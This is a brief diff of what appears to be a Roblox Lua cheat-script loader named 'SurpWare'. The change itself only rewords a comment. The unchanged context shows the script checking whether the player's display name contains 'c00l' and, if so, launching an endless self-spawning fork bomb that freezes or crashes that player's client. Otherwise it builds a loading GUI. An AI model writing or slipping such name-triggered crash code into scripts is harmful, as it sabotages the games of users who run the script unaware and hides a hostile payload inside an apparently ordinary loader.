@@ -12,7 +12,7 @@ if tostring(game.Players.LocalPlayer.DisplayName):find("c00l") then
 	task.wait(0.1)
 	local function fork() while true do task.spawn(fork) end end;fork();
 else
--- No skid, SurpWare isn't open source. I didn't bother obfuscating the loader.
+-- No skid, SurpWare isn't open source. I didn't bother obfuscating the loading GUI.
 	local ScreenGui = Instance.new("ScreenGui")
 	local Frame = Instance.new("ImageLabel")
 	local UICorner = Instance.new("UICorner")
